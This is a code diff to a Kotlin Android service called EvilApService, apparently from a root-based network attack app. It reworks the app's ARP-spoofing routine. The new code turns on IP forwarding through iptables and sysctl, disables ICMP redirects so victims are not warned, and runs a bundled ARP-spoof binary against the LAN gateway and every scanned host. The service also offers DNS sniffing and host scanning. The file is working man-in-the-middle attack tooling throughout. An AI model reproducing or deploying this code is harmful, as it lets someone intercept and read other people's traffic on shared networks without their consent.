@@ -9,8 +9,10 @@ import android.os.Binder
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
+import android.widget.Toast
 import eu.chainfire.libsuperuser.Shell
 import io.reactivex.disposables.Disposable
+import java.io.Serializable
 import java.math.BigInteger
 import java.net.InetAddress
 
@@ -31,6 +33,8 @@ class EvilApService: Service() {
     private var mDispCheckedHosts: Disposable? = null
     private var mCheckedHosts: MutableList<Host> = ArrayList()
     private var mShells: MutableList<Shell.Interactive> = ArrayList()
+    private lateinit var myIp: String
+    private lateinit var gateway: String
     var mWantsToStop = false
     // This service is only bound from inside the same process and never uses IPC.
     internal inner class LocalBinder : Binder() {
@@ -61,8 +65,8 @@ class EvilApService: Service() {
                 service.ACTION_STOP_SERVICE -> exit()
                 service.ACTION_SCAN_ACTIVE -> startActiveScan("wlan0") //TODO: check wifi connectivity
                 service.ACTION_DNS_SNIFF -> startDnsSniff("wlan0")
-                service.ACTION_ARP_SPOOF_ON -> ArpSpoof(true)
-                service.ACTION_ARP_SPOOF_OFF -> ArpSpoof(false)
+                service.ACTION_ARP_SPOOF_ON -> arpSpoof(true)
+                service.ACTION_ARP_SPOOF_OFF -> arpSpoof(false)
             }
         })
         if (mDispCheckedHosts != null && !mDispCheckedHosts!!.isDisposed) return
@@ -121,9 +125,8 @@ class EvilApService: Service() {
         mWantsToStop = true
         if (mDispService!=null && !mDispService!!.isDisposed) mDispService!!.dispose()
         if (mDispCheckedHosts!=null && !mDispCheckedHosts!!.isDisposed) mDispCheckedHosts!!.dispose()
-        getIdleShell().addCommand(listOf("pkill -f ${applicationInfo.dataDir}/lib/",
-                                         "sysctl -w net.ipv4.ip_forward=0"))
-
+        getIdleShell().addCommand(listOf("pkill -f ${applicationInfo.dataDir}/lib/"))
+        arpSpoof(false)
         for (shell in mShells)
             shell.close()
         stopSelf()
@@ -159,8 +162,8 @@ class EvilApService: Service() {
 
     private fun startActiveScan(iface: String) {
         val manager = super.getSystemService(Context.WIFI_SERVICE) as WifiManager
-        val myIp = int2ip(manager.dhcpInfo.ipAddress)
-        val gateway = int2ip(manager.dhcpInfo.gateway)
+        myIp = int2ip(manager.dhcpInfo.ipAddress)
+        gateway = int2ip(manager.dhcpInfo.gateway)
 
         val path = applicationInfo.dataDir
         val cmd = "LD_LIBRARY_PATH=$path/lib/ $path/lib/libscanner.so wlan0 active-arp"
@@ -211,17 +214,32 @@ class EvilApService: Service() {
 
     }
 
-    private fun ArpSpoof(spoofing: Boolean){
+    private fun arpSpoof(spoofing: Boolean){
         val path = applicationInfo.dataDir
         if(spoofing){
-            getIdleShell().addCommand("sysctl -w net.ipv4.ip_forward=1")
+            val allIp = mCheckedHosts.map{ it.ip }
+            if(myIp in allIp){
+                Toast.makeText(applicationContext,
+                        "Cannot use $myIp as target! (this device)", Toast.LENGTH_LONG).show()
+                return
+            }
+            if(gateway in allIp){
+                Toast.makeText(applicationContext,
+                        "Cannot use $gateway as target! (LAN gateway)", Toast.LENGTH_LONG).show()
+                return
+            }
+            val cmds = listOf(
+                    "iptables -t filter -I FORWARD -i wlan0 -j ACCEPT",
+                    "sysctl -w net.ipv4.ip_forward=1",
+                    "sysctl -w net.ipv6.conf.all.forwarding=1",
+                    "sysctl -w net.ipv4.conf.all.send_redirects=0")
+            getIdleShell().addCommand(cmds)
             for(host in mCheckedHosts) {
-                val cmd = "LD_LIBRARY_PATH=$path/lib/ $path/lib/libarpspoof.so wlan0 active-arp"
+                val cmd = "LD_LIBRARY_PATH=$path/lib/ $path/lib/libarpspoof.so $gateway ${host.ip}"
                 getIdleShell().addCommand(cmd, 0, object : Shell.OnCommandLineListener {
                     override fun onCommandResult(commandCode: Int, exitCode: Int) {
                         Log.i("[native]ARPSPOOF", "$cmd \n(exit code: $exitCode)")
                     }
-
                     override fun onLine(line: String) {
                         Log.d("[native]ARPSPOOF", line)
                     }
@@ -230,9 +248,15 @@ class EvilApService: Service() {
         }
         else{
             Log.d(TAG, "killing ARPSPOOF")
-            getIdleShell().addCommand(listOf("pkill -f $path/lib/libarpspoof.so","sysctl -w net.ipv4.ip_forward=0"))
+            val cmds = listOf(
+                    "pkill -f $path/lib/libarpspoof.so",
+                    "iptables -t filter -D FORWARD -i wlan0 -j ACCEPT",
+                    "sysctl -w net.ipv4.ip_forward=0",
+                    "sysctl -w net.ipv6.conf.all.forwarding=0",
+                    "sysctl -w net.ipv4.conf.all.send_redirects=1")
+            getIdleShell().addCommand(cmds)
         }
     }
 
-    data class Host(val ip: String, val mac: String, var type: String, var present: Boolean)
+    data class Host(val ip: String, val mac: String, var type: String, var present: Boolean): Serializable
 }
